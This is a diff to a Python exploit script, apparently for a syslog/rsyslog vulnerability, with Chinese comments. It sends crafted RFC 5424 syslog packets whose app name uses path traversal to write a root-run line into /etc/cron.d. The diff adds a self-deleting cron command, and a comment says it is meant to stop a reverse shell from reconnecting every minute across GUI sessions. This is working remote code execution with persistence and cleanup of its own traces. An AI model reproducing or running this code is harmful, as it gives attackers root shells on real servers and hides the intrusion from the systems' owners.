@@ -95,12 +95,25 @@ def check_write(host, port, name, tcp=False, tls=False, timeout=8):
     return "/tmp/cve59310_check_%s-syslog.log" % name, pkt
 
 
+def cron_command(body, name, prefix="cve59310"):
+    """一次性自毁 cron 命令：执行前先删除自身（cron 文件 + rsyslog 动态模板
+    自动创建的同名目录）。
+
+    cron 行是每分钟触发，若不删除自身，反弹 shell 会每分钟重连一次造成
+    会话雪崩（多次植入的旧 cron 叠加后更甚）——一次性化是 GUI 多会话场景
+    的必要约束，行为上等价于"每次动作 = 一次触发"。
+    """
+    cron_file = "/etc/cron.d/%s%s-syslog.log" % (prefix, name)
+    cron_dir = "/etc/cron.d/%s%s" % (prefix, name)
+    return 'rm -rf "%s" "%s"; %s' % (cron_file, cron_dir, body)
+
+
 def plant_cron(host, port, body, name, prefix="cve59310", tcp=False, tls=False,
                timeout=8):
-    """把 body 作为 cron 第 6 列命令植入 /etc/cron.d/<prefix><name>-syslog.log。"""
+    """植入一次性自毁计划任务 /etc/cron.d/<prefix><name>-syslog.log。"""
     dest = "etc/cron.d/%s%s" % (prefix, name)
     app = traversal_app(dest)
-    msg = "\n* * * * * root %s\n#" % body
+    msg = "\n* * * * * root %s\n#" % cron_command(body, name, prefix)
     pkt = build_rfc5424("h", app, msg)
     syslog_send(host, port, pkt, tcp=tcp, tls=tls, timeout=timeout)
     return "/etc/cron.d/%s%s-syslog.log" % (prefix, name), pkt
